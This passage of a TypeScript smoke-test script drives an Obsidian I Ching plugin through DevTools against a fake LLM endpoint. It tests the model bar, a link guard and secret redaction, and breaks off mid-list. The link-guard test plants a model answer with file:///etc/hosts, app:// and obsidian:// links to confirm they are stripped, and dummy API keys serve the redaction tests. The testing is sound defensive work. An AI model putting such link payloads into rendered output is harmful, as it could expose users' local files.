    client.on("end", () => { setTimeout(() => { if (!hinten.destroyed) hinten.end(); }, ms); });
    hinten.pipe(client);
    client.on("error", () => hinten.destroy());
    hinten.on("error", () => client.destroy());
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
  const port = (server.address() as { port: number }).port;
  return { port, close: () => new Promise<void>((r) => { for (const so of sockets) so.destroy(); server.close(() => r()); }) };
}

const ZEILE = ".yijing-oracle .okit-model-bar";

async function pruefeModellzeile(cdp: Cdp): Promise<void> {
  console.log("\nZ · Modellzeile im Panel (Kit buildModelBar, Aufgabe „Deutung“)");
  const NAMEN = PUNKTE.filter((n) => n.startsWith("Z-") && !Z_MANAGER_PUNKT.test(n));
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const MODELLE = ["zeile-a", "zeile-b", "zeile-c"];
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let vorsatz: Awaited<ReturnType<typeof verzoegernderVorsatz>> | null = null;
  let vorher: unknown = null;
  const letztesModell = (): string | null => ((stub?.letzte("chat")?.json as { model?: string } | null)?.model) ?? null;
  const zeile = (js: string): Promise<unknown> => cdp.evaluate(`const r = document.querySelector(${JSON.stringify(ZEILE)}); const sel = r?.querySelector(".okit-model-bar-select"); ${js}`);
  const gesperrt = (): Promise<{ da: boolean; select: boolean; neuLaden: boolean; stream: boolean }> => cdp.evaluate(`
    const r = document.querySelector(${JSON.stringify(ZEILE)});
    return { da: Boolean(r), select: Boolean(r?.querySelector(".okit-model-bar-select")?.disabled), neuLaden: Boolean(r?.querySelector(".okit-model-bar-refresh")?.disabled), stream: Boolean(document.querySelector(".yijing-stream, .okit-stream")) };`);
  try {
    await removeFakeManager(cdp);
    stub = await startLlmStub({ models: MODELLE, standard: { text: "Wort ".repeat(40), laenge: 5, takt: 120, model: MODELLE[0] } });
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null, request: ${P}.settings.request };`);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(stub.url)}, model: ${JSON.stringify(MODELLE[0])} }]; p.settings.llm.choice = {};
      p.settings.request = { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false };
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    console.log(`  Stub: ${stub.url} (Modelle ${MODELLE.join(", ")})`);

    // Frisches Panel, damit die Zeile mit den eben gesetzten Einstellungen gebaut wird.
    if (!(await neuesPanelMitWurf(cdp))) { for (const n of NAMEN) unmeasured(n, "Panel liess sich nicht oeffnen"); return; }
    const geladen = await pollUntil<boolean>(cdp, `return document.querySelectorAll(${JSON.stringify(ZEILE + " .okit-model-bar-select option")}).length >= 4 ? true : null;`, 6000, 200);

    // Z-a — genau eine Zeile, direkt unter dem Titel, mit aria-label.
    const a = await cdp.evaluate<{ n: number; vorTitel: boolean; aria: string | null }>(`
      const rows = document.querySelectorAll(${JSON.stringify(ZEILE)});
      const r = rows[0];
      return { n: rows.length, vorTitel: Boolean(r?.previousElementSibling?.classList.contains("yijing-title")), aria: r?.querySelector(".okit-model-bar-select")?.getAttribute("aria-label") ?? null };`);
    record(NAMEN[0]!, a.n === 1 && a.vorTitel && Boolean(a.aria && a.aria.includes("Interpretation")),
      `${a.n} Zeile(n), direkt unter dem Titel: ${a.vorTitel}, aria-label ${JSON.stringify(a.aria)}`);

    // Z-b — Dropdown: die Modelle des Stub plus Automatisch (value "").
    const opts = await cdp.evaluate<string[]>(`return [...document.querySelectorAll(${JSON.stringify(ZEILE + " .okit-model-bar-select option")})].map((o) => o.value);`);
    record(NAMEN[1]!, geladen === true && opts.includes("") && MODELLE.every((m) => opts.includes(m)) && opts.length === MODELLE.length + 1,
      `Optionen: ${JSON.stringify(opts)}`);

    // Z-e — Denk-Steuerung IN der Zeile, kein zweiter Knopf.
    const e = await cdp.evaluate<{ inZeile: number; imPanel: number }>(`
      return { inZeile: document.querySelectorAll(${JSON.stringify(ZEILE + " .okit-thinking-control")}).length, imPanel: document.querySelectorAll(".yijing-oracle .okit-thinking-control, .yijing-oracle .okit-thinking-toggle").length };`);
    record(NAMEN[5]!, e.inZeile === 1 && e.imPanel >= 1 && (await cdp.evaluate<number>(`return document.querySelectorAll(".yijing-oracle .okit-thinking-control").length;`)) === 1,
      `Denk-Steuerung in der Zeile: ${e.inZeile}, im ganzen Panel: ${e.imPanel}`);

    // Z-c — Wechsel auf zeile-b, dann eine Deutung: der Draht nennt zeile-b.
    await zeile(`sel.value = ${JSON.stringify(MODELLE[1])}; sel.dispatchEvent(new Event("change", { bubbles: true })); return true;`);
    const gewechselt = await pollUntil<boolean>(cdp, `return ${P}.llm.modelInUse() === ${JSON.stringify(MODELLE[1])} ? true : null;`, 4000, 200);
    stub.loescheMitschnitt();
    const lief = await laufeDeutung(cdp, 20000, "Smoke Z: Modellzeile", 15);
    await schlaf(300);
    record(NAMEN[2]!, gewechselt === true && lief && letztesModell() === MODELLE[1],
      `modelInUse ${gewechselt ? "= " + MODELLE[1] : "nicht gewechselt"}, Deutung ${lief ? "lief" : "lief nicht"}, Draht-Modell ${JSON.stringify(letztesModell())}`);

    // Z-d — gesperrt waehrend des Streams. Neuer Wurf, Deutung starten, mitten im Strom messen, abbrechen.
    await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
    await schlaf(500);
    await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
    const imStrom = await pollUntil<boolean>(cdp, `return document.querySelector(".okit-stream-tail")?.textContent?.length > 5 ? true : null;`, 15000, 200);
    const waehrend = await gesperrt();
    await cdp.evaluate(`document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`);
    await pollUntil<boolean>(cdp, `return document.querySelector(".yijing-stream, .okit-stream") ? null : true;`, 8000, 200);
    await schlaf(300);
    const danach = await gesperrt();
    record(NAMEN[3]!, imStrom === true && waehrend.select && waehrend.neuLaden && waehrend.stream && !danach.select && !danach.neuLaden,
      `im Strom: Dropdown ${waehrend.select ? "gesperrt" : "FREI"}, Neu-laden ${waehrend.neuLaden ? "gesperrt" : "FREI"}; danach: Dropdown ${danach.select ? "gesperrt" : "frei"}, Neu-laden ${danach.neuLaden ? "gesperrt" : "frei"}`);

    // Z-g — Aenderungen ausserhalb der Zeile: das Panel zeichnet NICHT neu (Marke an der Zeile bleibt), die Zeile zieht nach.
    await zeile(`r.dataset.smokeMarke = "1"; return true;`);
    const toggleAn = await cdp.evaluate<string | null>(`return document.querySelector(${JSON.stringify(ZEILE + " .okit-thinking-toggle")})?.getAttribute("aria-pressed") ?? null;`);
    await cdp.evaluate(`
      const p = ${P};
      await p.llm.setModel(${JSON.stringify(MODELLE[2])});
      p.settings.request = { ...p.settings.request, thinking: { ...p.settings.request.thinking, creative: "off" } };
      await p.saveSettings();
      return true;`);
    const nach = await pollUntil<{ marke: boolean; modell: string | null; an: string | null }>(cdp, `
      const r = document.querySelector(${JSON.stringify(ZEILE)});
      const modell = r?.querySelector(".okit-model-bar-select")?.value ?? null;
      const an = r?.querySelector(".okit-thinking-toggle")?.getAttribute("aria-pressed") ?? null;
      return modell === ${JSON.stringify(MODELLE[2])} && an === "false" ? { marke: r?.dataset.smokeMarke === "1", modell, an } : null;`, 4000, 200);
    record(NAMEN[7]!, nach !== null && nach.marke && toggleAn === "true",
      nach ? `Zeile zeigt ${JSON.stringify(nach.modell)}, Denken aria-pressed ${String(toggleAn)} → ${String(nach.an)}, Panel neu gezeichnet: ${nach.marke ? "nein" : "JA"}` : "Zeile zog nicht nach (Modell oder Denkstufe)");

    // Z-f — 260 px Panelbreite: nichts laeuft ueber den Rand; ein Bild der Zeile fuer die Sichtung.
    await cdp.evaluate(`app.workspace.rightSplit?.setSize?.(260); await new Promise((r) => setTimeout(r, 700)); return true;`);
    const breit = await cdp.evaluate<{ panel: number; zeileRechts: number; scroll: number; client: number; kinder: { cls: string; rechts: number }[] }>(`
      const panel = document.querySelector(".yijing-oracle").getBoundingClientRect();
      const r = document.querySelector(${JSON.stringify(ZEILE)});
      const rr = r.getBoundingClientRect();
      return { panel: panel.right, zeileRechts: rr.right, scroll: r.scrollWidth, client: r.clientWidth,
        kinder: [...r.children].map((k) => ({ cls: k.className, rechts: k.getBoundingClientRect().right })) };`);
    const ueber = breit.kinder.filter((k) => k.rechts > breit.panel + 1);
    record(NAMEN[6]!, breit.zeileRechts <= breit.panel + 1 && breit.scroll <= breit.client + 1 && ueber.length === 0,
      `Panel rechts ${Math.round(breit.panel)}, Zeile rechts ${Math.round(breit.zeileRechts)}, scrollWidth ${breit.scroll} / clientWidth ${breit.client}${ueber.length ? ", darueber hinaus: " + ueber.map((k) => k.cls).join(", ") : ""}`);
    await haltePanelBild(cdp, "zeile-260", ".yijing-oracle .yijing-title, " + ZEILE);
    await cdp.evaluate(`app.workspace.rightSplit?.setSize?.(420); await new Promise((r) => setTimeout(r, 400)); return true;`);

    // Z-d2 — Fenster `starting`: jede Verbindung zum Stub haelt der Vorsatz 1,5 s zurueck; 250 ms nach dem Klick ist das Panel noch nicht im
    // Strom (kein Stream-Bereich), die Zeile muss aber schon gesperrt sein.
    vorsatz = await verzoegernderVorsatz(stub.port, 1500);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(`http://127.0.0.1:${vorsatz.port}`)}, model: "" }];
      p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    await neuesPanelMitWurf(cdp);
    await pollUntil<boolean>(cdp, `return document.querySelectorAll(${JSON.stringify(ZEILE + " .okit-model-bar-select option")}).length >= 4 ? true : null;`, 12000, 300);
    await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
    await schlaf(250);
    const fenster = await gesperrt();
    record(NAMEN[4]!, fenster.da && !fenster.stream && fenster.select && fenster.neuLaden,
      `250 ms nach dem Klick: im Strom ${fenster.stream ? "ja" : "nein"}, Dropdown ${fenster.select ? "gesperrt" : "FREI"}, Neu-laden ${fenster.neuLaden ? "gesperrt" : "FREI"}`);
    // Lauf zu Ende kommen lassen (Abbrechen, sobald der Strom steht), damit der naechste Schritt ein ruhiges Panel hat.
    await pollUntil<boolean>(cdp, `return document.querySelector(".yijing-stream, .okit-stream") ? true : null;`, 15000, 200);
    await cdp.evaluate(`document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`);
    await pollUntil<boolean>(cdp, `return document.querySelector(".yijing-stream, .okit-stream") ? null : true;`, 8000, 200);

    // Z-i — Fruehausstieg: ohne Endpunkt kehrt die Deutung nach der Ansage zurueck, OHNE dass das Panel neu zeichnet. Die Sperre aus
    // dem Start muss im `finally` wieder fallen, sonst bleibt die Zeile bis zum naechsten Anstrich tot.
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = []; p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    await neuesPanelMitWurf(cdp);
    await schlaf(600);
    await zeile(`r.dataset.smokeMarke = "1"; return true;`);
    await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
    await schlaf(1500);
    const frei = await cdp.evaluate<{ da: boolean; marke: boolean; select: boolean; stream: boolean }>(`
      const r = document.querySelector(${JSON.stringify(ZEILE)});
      return { da: Boolean(r), marke: r?.dataset.smokeMarke === "1", select: Boolean(r?.querySelector(".okit-model-bar-select")?.disabled), stream: Boolean(document.querySelector(".yijing-stream, .okit-stream")) };`);
    record(NAMEN[9]!, frei.da && frei.marke && !frei.stream && !frei.select,
      `nach der Ansage: Zeile ${frei.da ? "da" : "WEG"}, Panel nicht neu gezeichnet: ${frei.marke}, im Strom: ${frei.stream ? "ja" : "nein"}, Dropdown ${frei.select ? "GESPERRT" : "frei"}`);

    // Z-h — nach all den Neuzeichnungen (Wurf, Deutung, Abbruch) bleibt es bei EINER Zeile.
    await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
    await schlaf(600);
    const n = await cdp.evaluate<number>(`return document.querySelectorAll(${JSON.stringify(ZEILE)}).length;`);
    record(NAMEN[8]!, n === 1, `${n} Zeile(n) im Panel`);
  } catch (err) {
    for (const nm of NAMEN) if (!aufgezeichnet(nm)) unmeasured(nm, `Messung abgebrochen: ${(err as Error).message}`);
  } finally {
    if (vorsatz) await vorsatz.close().catch(() => undefined);
    if (stub) await stub.stop().catch(() => undefined);
    await cdp.evaluate(`app.workspace.rightSplit?.setSize?.(420); return true;`).catch(() => null);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.settings.request = v.request;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** Z-j bis Z-l: die Zeile mit dem LLM Endpoint Manager (zentrale Fake-Brücke mit zwei Modellen). Was `setModel` mit Manager tut, steht im Kit
 *  (`endpoint-plumbing.ts`, `applyModel`): nur `choice.model` wird geschrieben, `endpoints` bleibt. Der Fake meldet nie „changed“ (`api.on` ist ein
 *  Nichts): Z-l misst deshalb den Install-Weg des Echtbetriebs (Manager kommt nach dem Plugin, Abo wartet auf `layout-change`), nicht das Ereignis. */
const Z_MANAGER_PUNKT = /^Z-[jkl] /;
const MGR_EP_ID = "zeile-mgr-ep";

async function pruefeModellzeileMitManager(cdp: Cdp): Promise<void> {
  console.log("\nZ · Modellzeile mit dem Endpunkt-Manager (Z-j bis Z-l)");
  const NAMEN = PUNKTE.filter((n) => Z_MANAGER_PUNKT.test(n));
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const [A, B, C] = ["mgr-zeile-a", "mgr-zeile-b", "mgr-zeile-c"] as [string, string, string];
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let vorher: unknown = null;
  let hatHuelle = false;
  const draht = (): string | null => ((stub?.letzte("chat")?.json as { model?: string } | null)?.model) ?? null;
  const zeile = (js: string): Promise<unknown> => cdp.evaluate(`const r = document.querySelector(${JSON.stringify(ZEILE)}); const sel = r?.querySelector(".okit-model-bar-select"); ${js}`);
  const optionen = (): Promise<{ value: string; text: string }[]> => cdp.evaluate(`return [...document.querySelectorAll(${JSON.stringify(ZEILE + " .okit-model-bar-select option")})].map((o) => ({ value: o.value, text: o.textContent ?? "" }));`);
  const installiere = async (modelle: string[], invalidiere: string[]): Promise<void> => { await installZentralFakeManager(cdp, {
    pluginId: MANAGER_PLUGIN_ID,
    endpunkte: [{ id: MGR_EP_ID, label: "Zeile Manager Endpoint", url: stub!.url, models: modelle, defaultModel: modelle[0]!, configModel: "default" }],
    invalidiere,
  }); };
  const setze = (): Promise<unknown> => cdp.evaluate(`
    const p = ${P};
    p.settings.llm.endpoints = [{ url: ${JSON.stringify(stub!.url)}, model: ${JSON.stringify(A)} }]; p.settings.llm.choice = {};
    p.settings.request = { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false };
    p.llm.invalidate(); await p.saveSettings();
    return true;`);
  try {
    stub = await startLlmStub({ models: [A, B], standard: { text: "Wort ".repeat(40), laenge: 5, takt: 120, model: A } });
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null, request: ${P}.settings.request };`);
    await removeFakeManager(cdp);
    await setze();
    await installiere([A, B], [PLUGIN_ID]);
    console.log(`  Stub: ${stub.url}, Fake-Manager mit ${A}, ${B}`);
    if (!(await neuesPanelMitWurf(cdp))) { for (const n of NAMEN) unmeasured(n, "Panel liess sich nicht oeffnen"); return; }
    const geladen = await pollUntil<boolean>(cdp, `return document.querySelectorAll(${JSON.stringify(ZEILE + " .okit-model-bar-select option")}).length >= 4 ? true : null;`, 6000, 200);

    // Z-j — „Anderer Endpunkt“ (Wert mit Steuerzeichen, kein Modellname) neben den Modellen und Automatisch; die Wahl ruft `app.setting.openTabById(manager)`.
    // Der Fake hat keinen Einstellungen-Tab: gemessen wird der AUFRUF (die Huelle ersetzt `open` und `openTabById`, es oeffnet sich kein Fenster).
    const opts = await optionen();
    const other = opts.find((o) => o.value.charCodeAt(0) === 1);
    await cdp.evaluate(`
      const s = app.setting;
      window.__zjVorher = { open: Object.prototype.hasOwnProperty.call(s, "open") ? s.open : null, tab: Object.prototype.hasOwnProperty.call(s, "openTabById") ? s.openTabById : null };
      window.__zjAufrufe = [];
      s.open = function () { window.__zjAufrufe.push("open"); };
      s.openTabById = function (id) { window.__zjAufrufe.push("tab:" + id); };
      return true;`);
    hatHuelle = true;
    if (other) await zeile(`sel.value = ${JSON.stringify(other.value)}; sel.dispatchEvent(new Event("change", { bubbles: true })); return true;`);
    const aufrufe = await cdp.evaluate<string[]>(`return window.__zjAufrufe ?? [];`);
    await huelleAb(cdp);
    hatHuelle = false;
    const text = other?.text ?? "";
    record(NAMEN[0]!, geladen === true && opts.length === 4 && opts.some((o) => o.value === "") && [A, B].every((m) => opts.some((o) => o.value === m))
      && ["Other endpoint …", "Anderer Endpunkt …"].includes(text) && aufrufe.includes(`tab:${MANAGER_PLUGIN_ID}`),
      `Optionen: ${JSON.stringify(opts.map((o) => (o.value.charCodeAt(0) === 1 ? "<Aktion>" : o.value)))}, Aktionstext ${JSON.stringify(text)}, Aufrufe nach der Wahl: ${JSON.stringify(aufrufe)}`);

    // Z-k — Wechsel auf das zweite Modell: choice.model = B, endpoints unveraendert, Draht nennt B; Automatisch loescht die Wahl, der Draht nennt wieder das Default A.
    const eps0 = await cdp.evaluate<string>(`return JSON.stringify(${P}.settings.llm.endpoints);`);
    await zeile(`sel.value = ${JSON.stringify(B)}; sel.dispatchEvent(new Event("change", { bubbles: true })); return true;`);
    const gewaehlt = await pollUntil<string>(cdp, `return ${P}.settings.llm.choice?.model === ${JSON.stringify(B)} ? ${P}.settings.llm.choice.model : null;`, 4000, 200);
    const eps1 = await cdp.evaluate<string>(`return JSON.stringify(${P}.settings.llm.endpoints);`);
    stub.loescheMitschnitt();
    const lief1 = await laufeDeutung(cdp, 20000, "Smoke Z: Modellzeile mit Manager", 15);
    await schlaf(300);
    const drahtB = draht();
    await zeile(`sel.value = ""; sel.dispatchEvent(new Event("change", { bubbles: true })); return true;`);
    const geloescht = await pollUntil<boolean>(cdp, `return ${P}.settings.llm.choice?.model ? null : true;`, 4000, 200);
    stub.loescheMitschnitt();
    const lief2 = await laufeDeutung(cdp, 20000, "Smoke Z: Modellzeile mit Manager, Automatisch", 15);
    await schlaf(300);
    const drahtA = draht();
    const mgrDefault = await cdp.evaluate<string | null>(`return app.plugins.plugins[${JSON.stringify(MANAGER_PLUGIN_ID)}]?.api?.get(${JSON.stringify(MGR_EP_ID)})?.defaultModel ?? null;`);
    record(NAMEN[1]!, gewaehlt === B && eps0 === eps1 && lief1 && drahtB === B && geloescht === true && lief2 && drahtA === A && mgrDefault === A,
      `choice.model nach dem Wechsel ${JSON.stringify(gewaehlt)}, endpoints ${eps0 === eps1 ? "unveraendert" : "VERAENDERT"}, Draht ${JSON.stringify(drahtB)} (erwartet ${B}); `
      + `Automatisch: Wahl ${geloescht ? "geloescht" : "NICHT geloescht"}, Draht ${JSON.stringify(drahtA)} (erwartet ${A}), Default des Managers ${JSON.stringify(mgrDefault)}`);

    // Z-l — Install-Weg: ohne Manager laden (das Abo wartet auf layout-change), Panel mit Marke an der Zeile, dann der Manager mit einem dritten Modell.
    await removeFakeManager(cdp);
    await setze();
    await reloadPlugin(cdp);
    if (!(await neuesPanelMitWurf(cdp))) { unmeasured(NAMEN[2]!, "Panel nach dem Neuladen liess sich nicht oeffnen"); return; }
    await pollUntil<boolean>(cdp, `return document.querySelectorAll(${JSON.stringify(ZEILE + " .okit-model-bar-select option")}).length >= 3 ? true : null;`, 6000, 200);
    const lokal = await optionen();
    await zeile(`r.dataset.smokeMarke = "1"; return true;`);
    await installiere([A, B, C], []);
    await cdp.evaluate(`app.workspace.trigger("layout-change"); return true;`);
    const mitManager = await pollUntil<{ value: string; text: string }[]>(cdp, `
      const o = [...document.querySelectorAll(${JSON.stringify(ZEILE + " .okit-model-bar-select option")})].map((x) => ({ value: x.value, text: x.textContent ?? "" }));
      return o.some((x) => x.value === ${JSON.stringify(C)}) ? o : null;`, 5000, 200);
    const marke = await cdp.evaluate<boolean>(`return document.querySelector(${JSON.stringify(ZEILE)})?.dataset.smokeMarke === "1";`);
    // Entfernen-Weg als Ist-Zustand: der Fake meldet nichts, das Kit-Abo kennt nur „kam“.
    await removeFakeManager(cdp);
    await cdp.evaluate(`app.workspace.trigger("layout-change"); return true;`);
    await schlaf(1500);
    const nachEntfernen = await optionen();
    const bleibt = nachEntfernen.some((o) => o.value === C);
    record(NAMEN[2]!, lokal.length === 3 && !lokal.some((o) => o.value === C) && mitManager !== null && mitManager.some((o) => o.value.charCodeAt(0) === 1) && marke,
      `ohne Manager ${lokal.length} Optionen; nach Installation und layout-change ${mitManager ? mitManager.length + " Optionen, " + C + " da" : C + " fehlt"}, Panel nicht neu gezeichnet: ${marke}. `
      + `Entfernen-Weg nichts gemessen (der Fake meldet nie „changed“); Ist-Zustand ohne Neuladen: Zeile zeigt ${bleibt ? "weiter die Liste des Managers" : "die lokale Liste"}`);
  } catch (err) {
    for (const nm of NAMEN) if (!aufgezeichnet(nm)) unmeasured(nm, `Messung abgebrochen: ${(err as Error).message}`);
  } finally {
    if (hatHuelle) await huelleAb(cdp).catch(() => undefined);
    await removeFakeManager(cdp).catch(() => undefined);
    if (stub) await stub.stop().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.settings.request = v.request;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** Nimmt die Huelle um `app.setting.open` und `openTabById` zurueck (Eigenschaft loeschen, wenn sie vorher keine eigene war). */
async function huelleAb(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    const s = app.setting; const v = window.__zjVorher;
    if (v) { if (v.open) s.open = v.open; else delete s.open; if (v.tab) s.openTabById = v.tab; else delete s.openTabById; }
    delete window.__zjVorher; delete window.__zjAufrufe;
    return true;`);
}

/** K — Linkschutz der Deutung (Kit `dom-guard`, seit obsidian-kit 0.70.0): was ein Modell an Link-Zielen in die Antwort schreibt, kommt im Panel
 *  nur an, wenn der Wächter es zulaesst. Gemessen am Attribut `href` der Anker in der fertigen Deutung (kein Klick). `javascript:` entfernt
 *  Obsidian selbst, `file:`, `app:` und `obsidian:` behielte es: dort wirkt der Wächter. */
const K_ANTWORT = "Siehe [OB](obsidian://open?vault=smoke-k) und [FI](file:///etc/hosts) und [AP](app://obsidian.md/x) und [HT](https://example.com/seite).";

async function pruefeLinkschutz(cdp: Cdp, port: number): Promise<void> {
  console.log("\nK · Linkschutz der Deutung");
  const NAMEN = PUNKTE.filter((n) => n.startsWith("K-"));
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let ui: SettingsUi | null = null;
  let vorher: unknown = null;
  const hrefs = (): Promise<Record<string, string | null>> => cdp.evaluate(`
    const out = {};
    for (const a of document.querySelectorAll(".yijing-interpretation-body a")) out[a.textContent.trim()] = a.getAttribute("href");
    return out;`);
  try {
    await removeFakeManager(cdp);
    stub = await startLlmStub({ models: ["link-modell"], standard: { text: K_ANTWORT, model: "link-modell" } });
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; const s = ${P}.settings; return { eps: l.endpoints, choice: l.choice ?? null, request: s.request, ol: s.allowObsidianLinks, li: s.allowLocalImages };`);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(stub.url)}, model: "link-modell" }]; p.settings.llm.choice = {};
      p.settings.allowObsidianLinks = false; p.settings.allowLocalImages = false;
      p.llm.invalidate(); await p.saveSettings();
      return true;`);

    // K-a — Default: die fertige Deutung traegt nur den https-Link mit Ziel.
    const lief = await laufeDeutung(cdp, 20000, "Smoke K: Linkschutz");
    await schlaf(500);
    const a = await hrefs();
    const aOk = lief && a["OB"] === null && a["FI"] === null && a["AP"] === null && (a["HT"] ?? "").startsWith("https://example.com/");
    record(NAMEN[0]!, aOk, lief ? `href: ${JSON.stringify(a)}` : "Deutungslauf lieferte kein Ergebnis");

    // K-d — die Darstellung (obsidian-kit 0.72.0): das Fake-DOM der Tests sieht keine Kaskade, hier gilt der berechnete Stil im Renderer. Der gekappte Link (OB) traegt kein href mehr, sein
    // Stil muss dem Text der Umgebung gleichen; der https-Link (HT) ist die Gegenprobe und bleibt unterstrichen mit Zeiger.
    const stil = await cdp.evaluate<Record<string, { deco: string; zeiger: string; farbe: string; eltern: string; bild: string } | null>>(`
      const out = {};
      for (const name of ["OB", "HT"]) {
        const a = [...document.querySelectorAll(".yijing-interpretation-body a")].find((x) => (x.textContent || "").trim() === name);
        if (!a) { out[name] = null; continue; }
        const cs = getComputedStyle(a); const ps = getComputedStyle(a.parentElement);
        out[name] = { deco: cs.textDecorationLine, zeiger: cs.cursor, farbe: cs.color, eltern: ps.color, bild: cs.backgroundImage };
      }
      return out;`);
    const ob = stil["OB"]; const ht = stil["HT"];
    record(NAMEN[3]!, lief && ob !== null && ht !== null && ob.deco === "none" && ob.zeiger !== "pointer" && ob.farbe === ob.eltern && ob.bild === "none" && ht.deco.includes("underline") && ht.zeiger === "pointer",
      `gekappter Link: ${JSON.stringify(ob)} · Link mit Ziel: ${JSON.stringify(ht)}`);

    // K-b — Schalter an (Wert direkt gesetzt, das Panel liest ihn je Antwort): obsidian:// bleibt, file: und app: nie.
    await cdp.evaluate(`${P}.settings.allowObsidianLinks = true; await ${P}.saveSettings(); return true;`);
    const lief2 = await laufeDeutung(cdp, 20000, "Smoke K: Linkschutz mit Schalter");
    await schlaf(500);
    const b = await hrefs();
    record(NAMEN[1]!, lief2 && (b["OB"] ?? "").startsWith("obsidian://") && b["FI"] === null && b["AP"] === null && (b["HT"] ?? "").startsWith("https://"),
      lief2 ? `href: ${JSON.stringify(b)}` : "Deutungslauf lieferte kein Ergebnis");
    await cdp.evaluate(`${P}.settings.allowObsidianLinks = false; await ${P}.saveSettings(); return true;`);

    // K-c — die Zeilen im Tab; ein Klick auf den Schalter der Links-Zeile schreibt allowObsidianLinks.
    ui = await openSettingsTab(cdp, port);
    if (!ui) { unmeasured(NAMEN[2]!, "Settings-Oberflaeche nicht gefunden"); return; }
    const w = wurzelAusdruck(ui);
    const zeilen = await ui.cdp.evaluate<{ links: boolean; bilder: boolean }>(`
      const namen = [...(${w}).querySelectorAll(".setting-item-name")].map((n) => n.textContent || "");
      return { links: namen.some((n) => /obsidian:\\/\\/|obsidian-links/i.test(n)), bilder: namen.some((n) => /local images|lokale bilder/i.test(n)) };`);
    await ui.cdp.evaluate(`
      const item = [...(${w}).querySelectorAll(".setting-item")].find((i) => /obsidian:\\/\\//i.test(i.querySelector(".setting-item-name")?.textContent || ""));
      item?.querySelector(".checkbox-container")?.click();
      return true;`);
    const geschrieben = await pollUntil<boolean>(cdp, `return ${P}.settings.allowObsidianLinks === true ? true : null;`, 4000, 200);
    record(NAMEN[2]!, zeilen.links && zeilen.bilder && geschrieben === true,
      `Zeilen im Tab: Links ${zeilen.links ? "da" : "FEHLT"}, Bilder ${zeilen.bilder ? "da" : "FEHLT"}; Klick schrieb allowObsidianLinks: ${geschrieben ? "ja" : "NEIN"}`);
  } catch (err) {
    for (const nm of NAMEN) if (!aufgezeichnet(nm)) unmeasured(nm, `Messung abgebrochen: ${(err as Error).message}`);
  } finally {
    if (ui) await closeSettings(cdp, ui);
    if (stub) await stub.stop().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.settings.request = v.request; p.settings.allowObsidianLinks = v.ol; p.settings.allowLocalImages = v.li;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** V1–V6: die Verbindung nach dem Tausch (Kit 0.51.2) — Schluessel je Zeile, Schwaerzung, Neutralisierung.
 *  Gegen einen Fake-Endpunkt, der den Request-Body aufzeichnet und das Platzhalter-Token aus der
 *  Anfrage in seine Antwort spiegelt (eine Bild-URL, ein dataviewjs-Block): so sieht der Treiber, was
 *  auf den Draht geht UND was der Renderer aus der Antwort macht. Lokaler Pfad ohne Manager. */
const SCHUTZ_MODELL = "qwen/qwen3.6-35b-a3b";
const V_GEHEIMNIS = "abcdefghijklmnop12345678";   // >= 16 Zeichen, sonst greift die Bearer-Regel nicht
const V_SK = "sk-abcdefghijklmnop1234";          // ohne Leerzeichen: steht als URL-Teil in einer Markdown-Bild-Syntax
const V_ZEILEN_SCHLUESSEL = "smoke-v5-schluessel";

async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
  console.log("\nV · Verbindung: Schluessel je Zeile, Schwaerzung, Neutralisierung");
  const NAMEN = [
    "V1 Zeile mit Klartext-Schluessel: nach resolve steht kein apiKey mehr in data.json, der Wert im Schluesselbund",
    "V2 Der Schluessel der Zeile geht als Bearer an den Endpunkt",
    "V3 Ein Geheimnis in der Frage geht als Platzhalter an den Draht, nicht im Klartext",
    "V4 Die Deutung zeigt das Original wieder (Schwaerzung ist umkehrbar)",
    "V5 Eine Antwort mit Bild-URL und Platzhalter erzeugt kein img-Element",
